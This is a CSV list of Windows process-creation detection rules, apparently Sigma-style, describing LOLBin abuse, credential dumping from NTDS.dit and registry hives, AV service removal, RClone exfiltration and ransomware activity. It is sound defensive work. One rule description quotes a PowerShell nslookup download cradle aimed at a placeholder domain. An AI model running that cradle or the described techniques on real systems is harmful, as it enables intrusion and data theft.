"title","level","service","category","description","id"
"RClone Execution","high","","process_creation","Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc","13dc41d6-0489-5505-887a-c3bc11ddec90"
"New Lolbin Process by Office Applications","high","","process_creation","This rule will monitor any office apps that spins up a new LOLBin process. This activity is pretty suspicious and should be investigated.","0fce2028-5a0d-536d-eafa-a00a85f184be"
"Read and Execute a File Via Cmd.exe","medium","","process_creation","Detect use of ""/R <"" to read and execute a file via cmd.exe","22061fc3-84a3-c190-7b04-d735915a8912"
"Potential Xor Encoded PowerShell Command","medium","","process_creation","Detects usage of ""xor"" or ""bxor"" in combination of a ""foreach"" loop. This pattern is often found in encoded powershell code and commands as a way to avoid detection","405d20b3-771f-a808-6794-c0aae7cf9cf6"
"Office Applications Spawning Wmi Cli Alternate","high","","process_creation","Initial execution of malicious document calls wmic to execute the file with regsvr32","5ffab4e3-fa0b-4adc-c733-2754d5d2e20a"
"WMI Reconnaissance List Remote Services","medium","","process_creation","An adversary might use WMI to check if a certain Remote Service is running on a remote device.
When the test completes, a service information will be displayed on the screen if it exists.
A common feedback message is that ""No instance(s) Available"" if the service queried is not running.
A common error message is ""Node - (provided IP or default) ERROR Description =The RPC server is unavailable"" if the provided remote host is unreachable
","105c3740-9666-1fe5-4e4f-e9e8bdf29dc1"
"Suspicious Characters in CommandLine","high","","process_creation","Detects suspicious Unicode characters in the command line, which could be a sign of obfuscation or defense evasion","c4c78b6f-2ead-8d39-dc1b-9ab4e88fc5b6"
"Regsvr32 Anomaly","high","","process_creation","Detects various anomalies in relation to regsvr32.exe","1b8521f9-1e64-123d-b6f0-d133e0b6f34c"
"Squirrel Lolbin","medium","","process_creation","Detects Possible Squirrel Packages Manager as Lolbin","6dd18e44-e4a2-1c08-3d0e-f4dc7e2fa9cc"
"CrackMapExecWin","critical","","process_creation","Detects CrackMapExecWin Activity as Described by NCSC","9fcbb5dc-f858-0445-bcf4-ade441a89dc3"
"Suspicious Cmd Execution via WMI","medium","","process_creation","Detects suspicious command execution (cmd) via Windows Management Instrumentation (WMI) on a remote host. This could be indicative of adversary lateral movement.","83f40f59-3ad9-6e41-f40d-b0c6cba08720"
"Visual Basic Script Execution","medium","","process_creation","Adversaries may abuse Visual Basic (VB) for execution","124493b3-4f31-c0bb-dbe9-97f0666635ba"
"Application Whitelisting Bypass via DLL Loaded by odbcconf.exe","medium","","process_creation","Detects defence evasion attempt via odbcconf.exe execution to load DLL","ec8ef858-1a44-a7b3-821d-a85f6cdaa1c9"
"Run from a Zip File","medium","","process_creation","Payloads may be compressed, archived, or encrypted in order to avoid detection","0557765a-6dad-b15a-5cf0-d92eef2b33ab"
"Trickbot Malware Reconnaissance Activity","high","","process_creation","Detects potential reconnaissance activity used by Trickbot malware. Trickbot enumerates domain/network topology and executes certain commands automatically every few minutes.","10aa2f9c-45d9-5c31-ffa2-06fc745b7e33"
"Suspicious Execution of Sc to Delete AV Services","high","","process_creation","Detects when attackers use ""sc.exe"" to delete AV services from the system in order to avoid detection","84bff3a1-2282-883e-eaff-6e74ffbf1e5f"
"Indirect Command Execution","low","","process_creation","Detect indirect command execution via Program Compatibility Assistant (pcalua.exe or forfiles.exe).","62997599-6864-08ee-302c-90c1649f5e1a"
"WMI Execution Via Office Process","medium","","process_creation","Initial execution of malicious document calls wmic to execute the file with regsvr32","0bca1760-51b3-cdf0-9756-923f2be12c94"
"Activity Related to NTDS.dit Domain Hash Retrieval","high","","process_creation","Detects suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely","b7e3098a-6c20-c6d3-df75-9b07536b3310"
"Base64 Encoded Listing of Shadowcopy","high","","process_creation","Detects base64 encoded listing Win32_Shadowcopy","13aab741-9ea4-27bf-57c1-aac004da4b9f"
"Monitoring Wuauclt.exe For Lolbas Execution Of DLL","medium","","process_creation","Adversaries can abuse wuauclt.exe (Windows Update client) to run code execution by specifying an arbitrary DLL.","86c08df9-01b6-6556-09cc-9ac6feb774e8"
"Execute MSDT.EXE Using Diagcab File","high","","process_creation","Detects diagcab leveraging the ""ms-msdt"" handler or the ""msdt.exe"" binary to execute arbitrary commands as seen in CVE-2022-30190","5294a012-1f07-fe01-599b-94cf8adf630e"
"Process Memory Dumped Via RdrLeakDiag.EXE","high","","process_creation","Detects uses of the rdrleakdiag.exe LOLOBIN utility to dump process memory","4d7489b1-282a-3c79-a3fe-e852cdea4515"
"Rundll32 JS RunHTMLApplication Pattern","high","","process_creation","Detects suspicious command line patterns used when rundll32 is used to run JavaScript code","8994ee03-9478-bde3-ab3d-3abafad0bfd1"
"Lazarus Activity Apr21","high","","process_creation","Detects different process creation events as described in Malwarebytes's threat report on Lazarus group activity","528921e1-f356-7cca-49a4-c5e1402eb356"
"Suspicious Rundll32 Script in CommandLine","medium","","process_creation","Detects suspicious process related to rundll32 based on arguments","ae18b229-740e-17c7-63f2-b15422d6271e"
"Suspicious Bitsadmin Job via PowerShell","high","","process_creation","Detect download by BITS jobs via PowerShell","a6124306-bb3c-9e0e-a088-a4dee392c1ee"
"PsExec Tool Execution","low","","process_creation","Detects PsExec service execution via default service image name","02e5fd82-2643-35a3-b104-51f4ef19c215"
"Excel Proxy Executing Regsvr32 With Payload Alternate","high","","process_creation","Excel called wmic to finally proxy execute regsvr32 with the payload.
An attacker wanted to break suspicious parent-child chain (Office app spawns LOLBin).
But we have command-line in the event which allow us to ""restore"" this suspicious parent-child chain and detect it.
Monitor process creation with ""wmic process call create"" and LOLBins in command-line with parent Office application processes.
","9b2384e8-4067-f192-274f-73d711fc193f"
"APT29","high","","process_creation","This method detects a suspicious PowerShell command line combination as used by APT29 in a campaign against U.S. think tanks.","9f2a9424-8e85-d783-1735-f72375b3b6d8"
"Run Whoami as SYSTEM","high","","process_creation","Detects a whoami.exe executed by LOCAL SYSTEM. This may be a sign of a successful local privilege escalation.","9586750a-6351-1543-241d-6d76087e4b01"
"Suspicious Esentutl Use","high","","process_creation","Detects flags often used with the LOLBAS Esentutl for malicious activity. It could be used in rare cases by administrators to access locked files or during maintenance.","c21b19ea-3369-9fab-3ca6-767d24c85595"
"Root Certificate Installed","medium","","process_creation","Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.","f378e980-dd67-4968-9df5-2ac09c718d4d"
"Malicious Base64 Encoded Powershell Invoke Cmdlets","high","","process_creation","Detects base64 encoded powershell cmdlet invocation of known suspicious cmdlets","a3b6ca34-23c2-eedd-8733-1294655ca76a"
"Stop Or Remove Antivirus Service","high","","process_creation","Detects usage of 'Stop-Service' or 'Remove-Service' powershell cmdlet to disable AV services.
Adversaries may disable security tools to avoid possible detection of their tools and activities by stopping antivirus service
","6ddd7376-3f18-f83d-1e75-58189e39abf1"
"Invoke-Obfuscation RUNDLL LAUNCHER","medium","","process_creation","Detects Obfuscated Powershell via RUNDLL LAUNCHER","2b349adb-9984-0950-4917-0629c50ff73b"
"TA505 Dropper Load Pattern","critical","","process_creation","Detects mshta loaded by wmiprvse as parent as used by TA505 malicious documents","0a67f769-527a-e79d-fa05-a4bbdcd6fcc4"
"Ryuk Ransomware Command Line Activity","critical","","process_creation","Detects Ryuk Ransomware command lines","7b159be0-8034-a6cb-dcb7-f6fbcf9b2680"
"Invoke-Obfuscation Via Use Rundll32","high","","process_creation","Detects Obfuscated Powershell via use Rundll32 in Scripts","300c09ba-ba6b-5fea-7022-567fa5593c41"
"Nslookup PwSh Download Cradle","medium","","process_creation","This rule tries to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]","79c252ba-3759-a153-7242-9f3de6ec7ba4"
"Indirect Command Exectuion via Forfiles","medium","","process_creation","Detects execition of commands and binaries from the context of ""forfiles.exe"". This can be used as a LOLBIN in order to bypass application whitelisting.","4bea8156-6003-3037-62a5-4be1429183b9"
"Stop Windows Service","low","","process_creation","Detects a Windows service to be stopped","5e1aa8a2-0c7e-a580-4093-894302350358"
"Suspicious File Download Using Office Application","high","","process_creation","Detects the usage of one of three Microsoft office applications (Word, Excel, PowerPoint) to download arbitrary files","dc86094c-5f6f-895a-e92a-8b82229db6b7"
"Suspicious Certutil Command Usage","high","","process_creation","Detects a suspicious Microsoft certutil execution with sub commands like 'decode' sub command, which is sometimes used to decode malicious code","540f0d7f-8d92-2c4b-ce07-2be23d582ede"
"Windows Update Client LOLBIN","high","","process_creation","Detects code execution via the Windows Update client (wuauclt)","a1901cc9-34ea-0ae3-68a7-07397e0d8338"
"Domain Trust Discovery","medium","","process_creation","Detects a discovery of domain trusts.","d5dc5032-aa74-54e8-76e0-3d264adc2ea0"
"Process Start From Suspicious Folder","low","","process_creation","Detects process start from rare or uncommon folders like temporary folder or folders that usually don't contain executable files","24e2ce91-6438-41b5-d23e-48e775ae72bd"
"Wscript Execution from Non C Drive","medium","","process_creation","Detects Wscript or Cscript executing from a drive other than C. This has been observed with Qakbot executing from within a mounted ISO file.","5f55c592-7555-3ca2-5d49-f1b7b74454ab"
"Excel Proxy Executing Regsvr32 With Payload","high","","process_creation","Excel called wmic to finally proxy execute regsvr32 with the payload.
An attacker wanted to break suspicious parent-child chain (Office app spawns LOLBin).
But we have command-line in the event which allow us to ""restore"" this suspicious parent-child chain and detect it.
Monitor process creation with ""wmic process call create"" and LOLBins in command-line with parent Office application processes.
","72d5e2d6-b55d-f6aa-2db3-4a5fd0d1dd98"
"Credential Acquisition via Registry Hive Dumping","high","","process_creation","Detects Credential Acquisition via Registry Hive Dumping","4973dea2-3985-affa-babc-f0c00821d2a1"
"Suspicious Add Scheduled Task From User AppData Temp","high","","process_creation","schtasks.exe create task from user AppData\Local\Temp","cb56735d-37c1-c9ff-010a-4f31ee20e531"
"Abusing Findstr for Defense Evasion","medium","","process_creation","Attackers can use findstr to hide their artifacts or search specific strings and evade defense mechanism","f7b13249-d828-2008-3a24-1364b5609ab5"
